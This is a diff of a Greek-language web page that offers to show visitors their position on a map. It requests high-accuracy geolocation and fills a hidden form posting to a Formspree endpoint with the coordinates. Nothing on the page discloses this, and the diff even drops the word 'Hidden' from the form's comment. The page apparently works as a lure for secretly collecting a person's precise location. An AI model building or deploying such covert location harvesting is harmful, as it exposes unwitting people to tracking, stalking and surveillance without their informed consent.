@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Δες τη θέση σου</title>
-  <!-- Leaflet CSS -->
   <link
     rel="stylesheet"
     href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
@@ -18,12 +17,9 @@
       background:#f0f0f0;
     }
     #loc-btn {
-      padding:1rem 2rem;
-      font-size:1.2rem;
-      border:none; border-radius:4px;
-      background:#007bff; color:#fff;
-      cursor:pointer;
-      box-shadow:0 2px 6px rgba(0,0,0,0.2);
+      padding:1rem 2rem; font-size:1.2rem;
+      border:none; border-radius:4px; background:#007bff; color:#fff;
+      cursor:pointer; box-shadow:0 2px 6px rgba(0,0,0,0.2);
     }
     #map { width:100%; height:100%; display:none; }
     #status {
@@ -31,8 +27,7 @@
       transform:translateX(-50%);
       background:rgba(255,255,255,0.9);
       padding:6px 10px; border-radius:4px;
-      font-size:0.9rem;
-      box-shadow:0 1px 4px rgba(0,0,0,0.2);
+      font-size:0.9rem; box-shadow:0 1px 4px rgba(0,0,0,0.2);
       z-index:500;
     }
   </style>
@@ -44,7 +39,7 @@
   <div id="map"></div>
   <div id="status"></div>
 
-  <!-- Hidden Formspree form -->
+  <!-- Formspree -->
   <form id="locForm"
         action="https://formspree.io/f/xldbgner"
         method="POST"
@@ -53,7 +48,6 @@
     <input type="hidden" name="longitude" id="lon">
   </form>
 
-  <!-- Leaflet JS -->
   <script
     src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
     integrity="sha256-gZ0GmTQLP8VAgUeC5G2H4o1NQ4z3o+TF2bV6EdD3HGI="
@@ -70,37 +64,46 @@
     let map, marker;
 
     btn.addEventListener('click', () => {
-      // Hide button, show map
+      // Hide button, show map area
       btnCont.style.display = 'none';
       mapDiv.style.display  = 'block';
-      status.textContent    = 'Ζητάω τη θέση σας…';
 
-      // Initialize Leaflet map
+      // Initialize map immediately so user sees something
       map = L.map('map').setView([0,0],2);
       L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         attribution: '© OpenStreetMap contributors'
       }).addTo(map);
 
-      // Trigger geolocation prompt
-      if (!navigator.geolocation) {
-        status.textContent = 'Ο browser δεν υποστηρίζει Geolocation.';
-      } else {
-        navigator.geolocation.getCurrentPosition(onSuccess, onError, {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
-        });
+      // Check geolocation permission state first
+      if (!navigator.permissions || !navigator.geolocation) {
+        status.textContent = 'Ο browser δεν υποστηρίζει τις απαραίτητες API.';
+        return;
       }
+
+      navigator.permissions.query({ name: 'geolocation' }).then(result => {
+        if (result.state === 'denied') {
+          status.innerHTML = 'Η πρόσβαση στη θέση έχει απορριφθεί.<br>Παρακαλώ ενεργοποίησέ την από τις ρυθμίσεις του browser.';
+        } else {
+          // prompt or granted
+          status.textContent = 'Ζητάω τη θέση σας…';
+          navigator.geolocation.getCurrentPosition(onSuccess, onError, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          });
+        }
+      });
     });
 
     function onSuccess(pos) {
       const { latitude, longitude } = pos.coords;
-      // Center & marker
+      // Center map & add marker
       map.setView([latitude, longitude], 14);
       marker = L.marker([latitude, longitude])
                 .addTo(map)
                 .bindPopup('Εδώ είστε.')
                 .openPopup();
+
       // Submit hidden form
       latInput.value = latitude;
       lonInput.value = longitude;
